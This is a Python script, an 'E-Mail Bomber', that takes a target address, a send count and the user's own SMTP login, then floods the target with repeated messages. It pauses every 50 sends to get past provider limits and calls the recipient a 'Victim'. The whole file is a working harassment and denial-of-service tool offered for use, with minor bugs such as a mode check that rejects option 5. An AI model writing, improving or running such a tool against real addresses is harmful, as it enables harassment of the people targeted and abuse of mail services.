import smtplib
import sys
import time
import os

def clearScreen():
    os.system('cls' if os.name=='nt' else 'clear')


class bColors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'


def banner():
    clearScreen()
    print(bColors.BLUE + r'''
 _______     _______ _______ _____             ______   _____  _______ ______  _______  ______
 |______ ___ |  |  | |_____|   |   |           |_____] |     | |  |  | |_____] |______ |_____/
 |______     |  |  | |     | __|__ |_____      |_____] |_____| |  |  | |_____] |______ |    \_
                                                                                              
    ''')
    print(bColors.YELLOW + r'''Kaboom!''')


class EmailBomber:
    count = 0

    def __init__(self):
        self.countFactor = None
        self.amount = None
        self.port = None
        self.server = None
        self.fromAddr = None
        self.fromPwd = None
        self.subject = None
        self.message = None
        self.msg = None
        self.s = None
        self.r = bColors.RED
        self.g = bColors.GREEN
        self.b = bColors.BLUE
        self.y = bColors.YELLOW
        try:
            print(self.b + '\n[+] Initializing bomber ...')
            self.target = str(input(self.g + '[:] Enter Target Email > '))
            self.mode = int(input(self.g + '[:] Enter how many emails? (Enter 1, 2, 3 or 4) || 1: 10 | 2: 50 | 3: 100 | 4: 200 | 5: 500 | 4: Custom Amount > '))

            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print(self.r + '[-] ERROR: Invalid Option!')
                sys.exit(0)

        except Exception as e:
            print(self.r + f'\n[-] ERROR: {e}')
            sys.exit(0)

    def bomb(self):
        try:
            print(self.b + '\n[+] Setting up bomber ...')

            if self.mode == int(1):
                self.amount = int(10)
            elif self.mode == int(2):
                self.amount = int(50)
            elif self.mode == int(3):
                self.amount = int(100)
            elif self.mode == int(4):
                self.amount = int(200)
            elif self.mode == int(5):
                self.amount = int(500)
            else:
                self.amount = int(input(self.g + '[:] Choose a CUSTOM amount > '))
            print(self.g + f'[+] You have chose {self.amount} emails as the amount.')

        except Exception as e:
            print(self.r + f'\n[-] ERROR: {e}')
            sys.exit(0)

    def email(self):
        try:
            print(self.b + '\n[+] Setting up email ...')
            self.server = str(input(self.g + '[:] Select E-mail Provider - 1: Gmail | 2: Yahoo (Untested) | 3: Outlook (Not Working) | 4: iCloud (Untested) | 5. Mail.com | 6: Custom > '))
            defaultPort = True

            if self.server == '6':
                defaultPort = False
                self.port = int(input(self.g + '[:] Enter port number > '))

            if defaultPort:
                self.port = int(587)

            if self.server == '1':
                print('FOR GMAIL, PLEASE ENABLE LESS SECURE APP ACCESS VIA https://myaccount.google.com/lesssecureapps OR THIS WILL NOT WORK!')
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            elif self.server == '4':
                self.server = 'smtp.mail.me.com'
            elif self.server == '5':
                print('SMTP FOR mail.com IS NOT SETUP AUTOMATICALLY, MAKE SURE ITS SETUP BEFORE YOU CONTINUE | https://www.mail.com/blog/posts/What-is-SMTP-authentication/94/')
                self.server = 'smtp.mail.com'

            self.fromAddr = str(input(self.g + '[:] Enter your email address > '))
            self.fromPwd = str(input(self.g + '[:] Enter your password > '))
            self.subject = str(input(self.g + '[:] Enter subject > '))
            self.message = str(input(self.g + '[:] Enter message > '))

            if self.target == self.fromAddr:
                print(self.r + '\n[-] WARNING: Having the same Attacker/Victim E-Mail address might cause issues on some providers.')

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)

        except Exception as e:
            print(self.r + f'\n[-] ERROR: {e}')
            sys.exit(0)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.message)
            self.count += 1
            loadSeq = float(self.count) * self.countFactor
            sys.stdout.write(self.y + '\r' + '[BOMBED EMAILS:' + self.b + f' {self.count}' + self.y + ']' + self.b +
                             ' [' + self.g + ('#' * int(loadSeq)) + self.b + ']')
            sys.stdout.flush()
            if self.count % 50 == 0 and self.count != self.amount:
                time.sleep(0.5)
                sys.stdout.flush()
                waitLimit = 60
                while waitLimit > 0:
                    sys.stdout.write(self.r + '\r' + f'[↻] Sent {self.count} emails ... RESETTING CONNECTION !! => ' +
                                     self.y + ' Wait for ' + str(waitLimit) + ' seconds')
                    time.sleep(1)
                    waitLimit -= 1
                    sys.stdout.flush()

        except Exception as e:
            print(self.r + f'\n[-] ERROR: {e}')
            sys.exit(0)

    def attack(self):
        print(self.b + '\n[+] Attacking ...')
        print(self.y + '\r' + '[' + self.r + '☠' + self.y + '] BOMBING emails')
        self.countFactor = float(100 / self.amount)
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(self.g + '\n[+] Attack Finished !!')
        print(self.g + f'[+] Successfully BOMBED {self.amount} emails !!')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = EmailBomber()
    bomb.bomb()
    bomb.email()
    clearScreen()
    bomb.attack()
    clearScreen()
